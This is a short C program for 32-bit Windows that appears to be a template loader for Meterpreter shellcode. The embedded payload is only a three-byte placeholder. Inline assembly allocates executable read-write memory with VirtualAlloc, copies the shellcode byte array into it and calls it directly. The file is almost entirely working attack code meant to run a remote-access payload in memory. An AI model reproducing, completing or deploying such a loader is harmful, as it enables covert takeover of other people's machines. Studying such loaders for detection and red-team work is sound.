#include <stdio.h>
#include <windows.h>

int main() {

    // Insert x86 Meterpreter shellcode  
    unsigned char code[] = "\xfc\xe8\x8f";

    // Variables to store the allocated memory address and shellcode size
    void* exec;
    DWORD codeSize = sizeof code;

    __asm {
        // Push the function arguments onto the stack in reverse order for VirtualAlloc
        push PAGE_EXECUTE_READWRITE
        push MEM_COMMIT
        push codeSize
        push 0

        // Call VirtualAlloc
        call VirtualAlloc

        // Store the result (allocated memory address) in 'exec'
        mov exec, eax

        // Clean up the stack (4 arguments * 4 bytes each)
        // add esp, 16
    }

    // Copy shellcode into allocated memory
    __asm {
        lea esi, [code]     ; Load the address of the code data into the ESI register using lea instruction
        mov edi, exec       ; Load the address of the allocated memory into the EDI register
        mov ecx, codeSize   ; Load the size of the code into the ECX register
        cld                 ; Clear the direction flag
        rep movsb           ; Copy the code data to the allocated memory byte by byte
    }

    // Execute shellcode in memory
    __asm {
        mov ebx, exec       ; Load the address of the allocated memory into the EBX register
        call ebx            ; Call the code in the allocated memory
    }

    return 0;
}
